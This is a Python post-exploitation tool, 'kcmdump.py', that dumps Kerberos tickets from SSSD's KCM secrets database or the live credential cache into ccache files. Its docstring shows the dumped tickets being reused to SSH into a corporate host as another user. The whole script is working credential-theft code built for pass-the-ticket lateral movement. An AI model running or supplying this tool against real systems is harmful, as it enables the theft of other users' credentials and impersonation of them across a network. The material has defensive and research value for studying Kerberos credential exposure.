#!/usr/bin/env python3

"""
$ apt install python3-construct python3-krb5 python3-ldb
$ python3 kcmdump.py out
$ python3 kcmdump.py -f /var/lib/sss/secrets/secrets.ldb out
$ ls -lh out/
-rw-r--r--. 1 root root 1.3K Jan 1 00:00 user_0.ccache
-rw-r--r--. 1 root root 1.3K Jan 1 00:00 user_1.ccache
$ KRB5CCNAME=out/user_0.ccache klist
$ KRB5CCNAME=out/user_0.ccache ssh user@corp.local@target.corp.local

References:
- https://sssd.io/release-notes/sssd-2.0.0.html
- https://github.com/SSSD/sssd/tree/master/src/responder/kcm
- https://web.mit.edu/kerberos/www/krb5-latest/doc/formats/ccache_file_format.html
- https://github.com/mandiant/SSSDKCMExtractor
- https://github.com/blacklanternsecurity/KCMTicketFormatter
"""

from argparse import ArgumentParser
from pathlib import Path
from struct import pack

import krb5
from construct import Struct, this, Byte, Bytes, Int8ul, Int32ul, Array, PascalString, If
from ldb import Ldb

KCM_BASEDN = 'cn=kcm'
CCACHE_HEADER = '0504000c00010008ffffffff00000000'


Cred = Struct(
    'uuid' / Array(16, Byte),
    'blob_len' / Int32ul,
    'blob' / Bytes(this.blob_len)
)


KCMCCache = Struct(
    'kdc_offset' / Int32ul,
    'principal_presence' / Int8ul,
    'realm' / PascalString(Int32ul, 'utf-8'),
    'type' / Int32ul,
    'data' / If((this.principal_presence == 1),
        Struct(
            'principals_len' / Int32ul,
            'principals' / Array(this.principals_len, PascalString(Int32ul, 'utf-8')),
            'creds_len' / Int32ul,
            'creds' / Array(this.creds_len, Cred)
    ))
)


def dump_online(output):

    output = Path(output)
    output.mkdir(exist_ok=True)
    ctx = krb5.init_context()

    for ccache in krb5.cccol_iter(ctx):

        principal = krb5.cc_get_principal(ctx, ccache)

        file = output / f'{principal.components[0].decode()}.ccache'
        dest_cc = krb5.cc_resolve(ctx, f'FILE:{file}'.encode())
        krb5.cc_initialize(ctx, dest_cc, principal)

        for credential in ccache:
            krb5.cc_store_cred(ctx, dest_cc, credential)


def dump_database(database, output):

    db = Ldb(database)
    containers = db.search(base=KCM_BASEDN, expression='type=container', attrs=['dn']).msgs

    output = Path(output)
    output.mkdir(exist_ok=True)

    for i, container in enumerate(containers):
        secrets = db.search(container.dn, expression='secret=*', attrs=['secret']).msgs

        for j, secret in enumerate(secrets):
            secret = secret['secret'].get(0)
            try:
                kcm_cc = KCMCCache.parse(secret)
            except:
                print(f'error: could not parse secret {j}')
                continue

            if not kcm_cc.data:
                continue

            with open(output / f'{kcm_cc.data.principals[0]}_{i*j+j}.ccache', 'wb') as ccache:

                # 1. Header
                ccache.write(bytes.fromhex(CCACHE_HEADER))

                # 2. Default principal
                ccache.write(pack('>I', kcm_cc.type))
                ccache.write(pack('>I', kcm_cc.data.principals_len))
                ccache.write(pack('>I', len(kcm_cc.realm)))
                ccache.write(kcm_cc.realm.encode())
                for principal in kcm_cc.data.principals:
                    ccache.write(pack('>I', len(principal)))
                    ccache.write(principal.encode())

                # 3. Credentials
                for cred in kcm_cc.data.creds:
                    ccache.write(cred.blob)


def main():
    parser = ArgumentParser(description='KCM Dumper')
    parser.add_argument('-f', '--file', help='path to the KCM secrets database')
    parser.add_argument('output', nargs='?', default='.', help='path to the output folder')
    args = parser.parse_args()

    if args.file:
        dump_database(args.file, args.output)
    else:
        dump_online(args.output)


if __name__ == '__main__':
    main()

